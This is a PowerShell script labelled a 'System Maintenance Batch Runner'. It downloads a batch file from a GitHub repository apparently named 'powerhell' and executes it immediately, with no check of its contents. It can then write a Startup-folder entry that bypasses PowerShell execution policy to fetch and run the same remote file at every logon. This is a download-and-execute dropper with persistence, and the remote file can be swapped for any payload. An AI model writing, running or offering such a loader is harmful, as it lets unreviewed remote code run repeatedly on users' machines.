# Configuration
$githubUrl = "https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/ss.bat"
$batFileName = "ss.bat"
$tempPath = "$env:TEMP\$batFileName"
$autorunPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ss.bat"

# Function to download and run the batch file
function Run-BatchFile {
    Write-Host "Downloading batch file from GitHub..." -ForegroundColor Cyan
    
    try {
        # Download the batch file
        Invoke-WebRequest -Uri $githubUrl -OutFile $tempPath -ErrorAction Stop
        Write-Host "Downloaded successfully to: $tempPath" -ForegroundColor Green
        
        # Run the batch file
        Write-Host "Executing batch file..." -ForegroundColor Cyan
        & cmd.exe /c $tempPath
        Write-Host "Batch file executed." -ForegroundColor Green
    }
    catch {
        Write-Host "Error downloading or running batch file: $_" -ForegroundColor Red
        exit 1
    }
}

# Function to add to autostart
function Add-ToAutostart {
    Write-Host "Adding batch file to autostart..." -ForegroundColor Cyan
    
    try {
        # Ensure the Startup folder exists
        if (-not (Test-Path (Split-Path $autorunPath))) {
            New-Item -ItemType Directory -Path (Split-Path $autorunPath) -Force | Out-Null
        }
        
        # Create a batch file in the Startup folder that downloads and runs from GitHub
        $autorunContent = @"
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '$githubUrl' -OutFile '%TEMP%\$batFileName'; cmd.exe /c '%TEMP%\$batFileName'"
"@
        
        Set-Content -Path $autorunPath -Value $autorunContent -Force
        Write-Host "Added to autostart: $autorunPath" -ForegroundColor Green
    }
    catch {
        Write-Host "Error adding to autostart: $_" -ForegroundColor Red
        exit 1
    }
}

# Main execution
Write-Host "=== System Maintenance Batch Runner ===" -ForegroundColor Cyan
Write-Host ""

# Run the batch file immediately
Run-BatchFile

# Ask user if they want to add to autostart
Write-Host ""
$response = Read-Host "Add to Windows Startup? (y/n)"

if ($response -eq 'y' -or $response -eq 'Y') {
    Add-ToAutostart
    Write-Host "Setup complete! The batch file will run automatically on next startup." -ForegroundColor Green
}
else {
    Write-Host "Skipped autostart setup." -ForegroundColor Yellow
}

Write-Host ""
